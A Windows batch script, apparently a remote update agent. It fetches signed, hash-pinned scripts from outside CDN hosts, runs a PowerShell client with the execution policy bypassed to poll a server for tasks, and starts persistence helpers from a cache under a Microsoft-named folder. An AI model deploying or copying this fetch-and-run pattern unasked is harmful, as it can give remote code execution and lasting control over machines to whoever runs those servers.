@echo off
setlocal EnableExtensions EnableDelayedExpansion
rem WINRTCS_AGENT
rem Unsigned steady-state candidate 1.0.0.24.
rem The server row decides LEGACY, DEVICE_PENDING, and DEVICE_ACTIVE.
rem Tick performs challenge, heartbeat, poll, get, and result.
rem The device base comes from the hash-pinned generation config, not the task environment.
rem The device client is verified in stage before commit and only the live
rem committed copy is executed. No bearer fallback. No TLS bypass. No local mode file.
set "AGENT_VER=1.0.0.24"
set "FLOOR=1792000000"
set "ZD=C:\ProgramData\WinRTCS"
set "CACHE=C:\ProgramData\Microsoft\WinRTCS\cache"
set "STAGE=%CACHE%\stage"
set "BASE=https://cdn.seczio.com/winrtcs"
set "FALLBACK=https://cdn.wirbe.com/winrtcs"
set "CURL=%SystemRoot%\System32\curl.exe"
if not exist "%ZD%" mkdir "%ZD%" >nul 2>&1
if not exist "%CACHE%" mkdir "%CACHE%" >nul 2>&1
if not exist "%STAGE%" mkdir "%STAGE%" >nul 2>&1
call :Update
if errorlevel 1 call :KeepOld
call :RequireVerifiedClient
if errorlevel 1 (
  echo [%DATE% %TIME%] client_hash_rejected>>"%ZD%\winrtcs.log"
  exit /b 1
)
call :PreserveGuid
if defined WINRTCS_DEVICE_BEARER (
  echo [%DATE% %TIME%] bearer_refused>>"%ZD%\winrtcs.log"
  exit /b 1
)
echo [%DATE% %TIME%] device_tick_started>>"%ZD%\winrtcs.log"
powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%CLIENT%" -Action Tick -WorkDir "%ZD%"
set "RC=%ERRORLEVEL%"
echo [%DATE% %TIME%] device_tick_exit_!RC!>>"%ZD%\winrtcs.log"
powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%ZD%\winrtcs_keeper.ps1" -Action Ensure
set "KRC=%ERRORLEVEL%"
echo [%DATE% %TIME%] keeper_exit_!KRC!>>"%ZD%\winrtcs.log"
exit /b %RC%

:Update
if defined WINRTCS_UPDATE_BASE (
  echo %WINRTCS_UPDATE_BASE% | findstr /I /B /C:"https://" >nul || exit /b 1
  set "BASE=%WINRTCS_UPDATE_BASE%"
)
call :FetchSoftware winrtcs.version "%STAGE%\winrtcs.version"
set "CODE_VER=!HTTP_CODE!"
call :FetchSoftware winrtcs.version.sig "%STAGE%\winrtcs.version.sig"
set "CODE_SIG=!HTTP_CODE!"
if not exist "%STAGE%\winrtcs.version" if not exist "%STAGE%\winrtcs.version.sig" (
  if "!CODE_VER!"=="401" exit /b 1
  if "!CODE_SIG!"=="401" exit /b 1
  if "!CODE_VER!"=="403" exit /b 1
  if "!CODE_SIG!"=="403" exit /b 1
  set "BASE=%FALLBACK%"
  call :FetchSoftware winrtcs.version "%STAGE%\winrtcs.version"
  call :FetchSoftware winrtcs.version.sig "%STAGE%\winrtcs.version.sig"
)
call :VerifyManifest
if errorlevel 1 exit /b 1
call :Floor
if errorlevel 1 exit /b 1
call :LoadPins
call :FetchPinned winrtcs_agent.cmd "%STAGE%\winrtcs_agent.cmd" "!AGENT_SHA!" WINRTCS_AGENT
if errorlevel 1 exit /b 1
call :FetchPinned winrtcs_guard.cmd "%STAGE%\winrtcs_guard.cmd" "!GUARD_SHA!" WINRTCS_GUARD
if errorlevel 1 exit /b 1
call :FetchPinned winrtcs_sentinel.cmd "%STAGE%\winrtcs_sentinel.cmd" "!SENT_SHA!" WINRTCS_SENTINEL
if errorlevel 1 exit /b 1
call :FetchPinned winrtcs_run.cmd "%STAGE%\winrtcs_run.cmd" "!RUN_SHA!" WINRTCS_RUN
if errorlevel 1 exit /b 1
call :FetchPinned winrtcs_gen_commit.ps1 "%STAGE%\winrtcs_gen_commit.ps1" "!COMMIT_SHA!" WINRTCS_GEN_COMMIT
if errorlevel 1 exit /b 1
call :FetchPinned winrtcs_device_client.ps1 "%STAGE%\winrtcs_device_client.ps1" "!CLIENT_SHA!" WINRTCS_DEVICE_CLIENT
if errorlevel 1 exit /b 1
call :FetchPinned winrtcs_device.cfg "%STAGE%\winrtcs_device.cfg" "!CONFIG_SHA!" WINRTCS_DEVICE_CFG
if errorlevel 1 exit /b 1
call :FetchPinned winrtcs_continuity.ps1 "%STAGE%\winrtcs_continuity.ps1" "!CONT_SHA!" WINRTCS_CONTINUITY
if errorlevel 1 exit /b 1
call :FetchPinned winrtcs_watchdog.cmd "%STAGE%\winrtcs_watchdog.cmd" "!WATCH_SHA!" WINRTCS_WATCHDOG
if errorlevel 1 exit /b 1
call :FetchPinned winrtcs_wdgate.cmd "%STAGE%\winrtcs_wdgate.cmd" "!GATE_SHA!" WINRTCS_WDGATE
if errorlevel 1 exit /b 1
call :FetchPinned winrtcs_keeper.ps1 "%STAGE%\winrtcs_keeper.ps1" "!KEEPER_SHA!" WINRTCS_KEEPER
if errorlevel 1 exit /b 1
if not exist "%STAGE%\ok.agent" exit /b 1
if not exist "%STAGE%\ok.guard" exit /b 1
if not exist "%STAGE%\ok.sentinel" exit /b 1
if not exist "%STAGE%\ok.run" exit /b 1
if not exist "%STAGE%\ok.commit" exit /b 1
if not exist "%STAGE%\ok.client" exit /b 1
if not exist "%STAGE%\ok.config" exit /b 1
if not exist "%STAGE%\ok.continuity" exit /b 1
if not exist "%STAGE%\ok.watchdog" exit /b 1
if not exist "%STAGE%\ok.wdgate" exit /b 1
if not exist "%STAGE%\ok.keeper" exit /b 1
call :RequireVerifiedClient STAGE
if errorlevel 1 exit /b 1
powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%STAGE%\winrtcs_gen_commit.ps1"
if errorlevel 1 exit /b 1
echo [%DATE% %TIME%] generation_commit>>"%ZD%\winrtcs.log"
exit /b 0

:KeepOld
echo [%DATE% %TIME%] generation_kept_old>>"%ZD%\winrtcs.log"
exit /b 0

:PreserveGuid
powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%CLIENT%" -Action PreserveGuid -WorkDir "%ZD%" >nul 2>&1
exit /b 0

:RequireVerifiedClient
set "MAN=%ZD%\winrtcs.version"
set "CLIENT=%ZD%\winrtcs_device_client.ps1"
if /I "%~1"=="STAGE" (
  set "MAN=%STAGE%\winrtcs.version"
  set "CLIENT=%STAGE%\winrtcs_device_client.ps1"
)
if not exist "!MAN!" if /I not "%~1"=="STAGE" if exist "%CACHE%\winrtcs.version" set "MAN=%CACHE%\winrtcs.version"
if not exist "!MAN!" exit /b 1
if not exist "!CLIENT!" exit /b 1
findstr /C:"WINRTCS_DEVICE_CLIENT" "!CLIENT!" >nul 2>&1
if errorlevel 1 exit /b 1
set "CLIENT_SHA="
for /f "usebackq tokens=1,* delims==" %%K in ("!MAN!") do if /I "%%K"=="CLIENT_SHA256" set "CLIENT_SHA=%%L"
if not defined CLIENT_SHA exit /b 1
set "GOTC="
call :Sha256 "!CLIENT!" GOTC
if /I not "!GOTC!"=="!CLIENT_SHA!" exit /b 1
exit /b 0

:FetchSoftware
del /f /q "%~2" >nul 2>&1
del /f /q "%~2.http" >nul 2>&1
"%CURL%" -f -L -H "Cache-Control: no-cache" -H "Pragma: no-cache" --connect-timeout 6 --max-time 25 -o "%~2" -w "%%{http_code}" "%BASE%/%~1?t=%RANDOM%%RANDOM%" > "%~2.http" 2>nul
set "FETCH_RC=!ERRORLEVEL!"
set "HTTP_CODE=000"
if exist "%~2.http" set /p HTTP_CODE=<"%~2.http"
if not "!FETCH_RC!"=="0" del /f /q "%~2" >nul 2>&1
exit /b 0

:VerifyManifest
if not exist "%STAGE%\winrtcs.version" exit /b 1
if not exist "%STAGE%\winrtcs.version.sig" exit /b 1
powershell -NoProfile -NonInteractive -Command "$ErrorActionPreference='Stop'; $sigB64=(Select-String -LiteralPath '%STAGE%\winrtcs.version.sig' -Pattern '^sig=(.+)$' | Select-Object -First 1).Matches.Groups[1].Value; if(-not $sigB64){ exit 1 }; $rsa=New-Object System.Security.Cryptography.RSACryptoServiceProvider; $p=New-Object System.Security.Cryptography.RSAParameters; $p.Modulus=[Convert]::FromBase64String('8DqwRNmYBSaROA/XTrOje0YqHIGfKhoaUKkeb1ds4BZRAJDCDu1l5ctBRfR+neHIApUaxl3RMIuUez4BnAmbTjBJ4YrJJqKW4uCGRS42kfFaGXUM9VJCxEcki8md2Fjzc7FlH3lutDoi2dPel46ntrWxGhwWQ8TME3MKdulZ7xzCbjXvkxrLMkWZ74w0oCvYYKGlS1ghYk4mxnZGXyFtXCSTGyEOL20INskjdYkYhlHMvj+xjJV0S55GNh3miFjBZmOROVXljTH3SezV/fxXmc2jShL5RH2jjkre4pzlP3HewwU0oelymG4yk0MYjoYyJD8WvSBf6C0bxESHUmCv7Q=='); $p.Exponent=[Convert]::FromBase64String('AQAB'); $rsa.ImportParameters($p); $data=[IO.File]::ReadAllBytes('%STAGE%\winrtcs.version'); if($rsa.VerifyData($data,'SHA256',[Convert]::FromBase64String($sigB64))){ exit 0 }; exit 1" >nul 2>&1
exit /b %ERRORLEVEL%

:Floor
set "NEWTS=0"
set "OLDTS=0"
set "LIVETS=0"
for /f "usebackq tokens=1,* delims==" %%K in ("%STAGE%\winrtcs.version") do if /I "%%K"=="BUILD_TS" set "NEWTS=%%L"
if exist "%CACHE%\winrtcs.version" for /f "usebackq tokens=1,* delims==" %%K in ("%CACHE%\winrtcs.version") do if /I "%%K"=="BUILD_TS" set "OLDTS=%%L"
if exist "%ZD%\winrtcs.version" for /f "usebackq tokens=1,* delims==" %%K in ("%ZD%\winrtcs.version") do if /I "%%K"=="BUILD_TS" set "LIVETS=%%L"
set /a NEWTS+=0 2>nul
set /a OLDTS+=0 2>nul
set /a LIVETS+=0 2>nul
if !NEWTS! LSS %FLOOR% exit /b 1
if !NEWTS! LSS !OLDTS! exit /b 1
if !NEWTS! LSS !LIVETS! exit /b 1
if !NEWTS! EQU !OLDTS! (
  set "NEWH="
  set "OLDH="
  for /f "usebackq tokens=1,* delims==" %%K in ("%STAGE%\winrtcs.version") do if /I "%%K"=="AGENT_SHA256" set "NEWH=%%L"
  if exist "%CACHE%\winrtcs.version" for /f "usebackq tokens=1,* delims==" %%K in ("%CACHE%\winrtcs.version") do if /I "%%K"=="AGENT_SHA256" set "OLDH=%%L"
  if defined OLDH if defined NEWH if /I not "!NEWH!"=="!OLDH!" exit /b 1
)
exit /b 0

:LoadPins
set "AGENT_SHA="
set "GUARD_SHA="
set "SENT_SHA="
set "RUN_SHA="
set "COMMIT_SHA="
set "CLIENT_SHA="
set "CONFIG_SHA="
set "CONT_SHA="
set "WATCH_SHA="
set "GATE_SHA="
set "KEEPER_SHA="
for /f "usebackq tokens=1,* delims==" %%K in ("%STAGE%\winrtcs.version") do (
  if /I "%%K"=="AGENT_SHA256" set "AGENT_SHA=%%L"
  if /I "%%K"=="GUARD_SHA256" set "GUARD_SHA=%%L"
  if /I "%%K"=="SENTINEL_SHA256" set "SENT_SHA=%%L"
  if /I "%%K"=="RUN_SHA256" set "RUN_SHA=%%L"
  if /I "%%K"=="COMMIT_SHA256" set "COMMIT_SHA=%%L"
  if /I "%%K"=="CLIENT_SHA256" set "CLIENT_SHA=%%L"
  if /I "%%K"=="CONFIG_SHA256" set "CONFIG_SHA=%%L"
  if /I "%%K"=="CONTINUITY_SHA256" set "CONT_SHA=%%L"
  if /I "%%K"=="WATCHDOG_SHA256" set "WATCH_SHA=%%L"
  if /I "%%K"=="LAUNCHER_SHA256" set "GATE_SHA=%%L"
  if /I "%%K"=="KEEPER_SHA256" set "KEEPER_SHA=%%L"
)
exit /b 0

:FetchPinned
if "%~3"=="" exit /b 1
call :FetchSoftware "%~1" "%~2.dl"
set "GOT="
if exist "%~2.dl" call :Sha256 "%~2.dl" GOT
if /I not "!GOT!"=="%~3" (
  del /f /q "%~2.dl" >nul 2>&1
  exit /b 1
)
findstr /C:"%~4" "%~2.dl" >nul 2>&1
if errorlevel 1 if /I "%~4"=="WINRTCS_DEVICE_CFG" findstr /C:"DEVICE_BASE=https://" "%~2.dl" >nul 2>&1
if errorlevel 1 (
  del /f /q "%~2.dl" >nul 2>&1
  exit /b 1
)
move /y "%~2.dl" "%~2" >nul 2>&1
if errorlevel 1 exit /b 1
if /I "%~4"=="WINRTCS_AGENT" >"%STAGE%\ok.agent" echo 1
if /I "%~4"=="WINRTCS_GUARD" >"%STAGE%\ok.guard" echo 1
if /I "%~4"=="WINRTCS_SENTINEL" >"%STAGE%\ok.sentinel" echo 1
if /I "%~4"=="WINRTCS_RUN" >"%STAGE%\ok.run" echo 1
if /I "%~4"=="WINRTCS_GEN_COMMIT" >"%STAGE%\ok.commit" echo 1
if /I "%~4"=="WINRTCS_DEVICE_CLIENT" >"%STAGE%\ok.client" echo 1
if /I "%~4"=="WINRTCS_DEVICE_CFG" >"%STAGE%\ok.config" echo 1
if /I "%~4"=="WINRTCS_CONTINUITY" >"%STAGE%\ok.continuity" echo 1
if /I "%~4"=="WINRTCS_WATCHDOG" >"%STAGE%\ok.watchdog" echo 1
if /I "%~4"=="WINRTCS_WDGATE" >"%STAGE%\ok.wdgate" echo 1
if /I "%~4"=="WINRTCS_KEEPER" >"%STAGE%\ok.keeper" echo 1
exit /b 0

:Sha256
set "%~2="
for /f "skip=1 delims=" %%H in ('certutil -hashfile "%~1" SHA256 2^>nul') do (
  set "_h=%%H"
  set "_h=!_h: =!"
  if not defined %~2 if "!_h:~63,1!" NEQ "" if "!_h:~64,1!"=="" set "%~2=!_h!"
)
exit /b 0
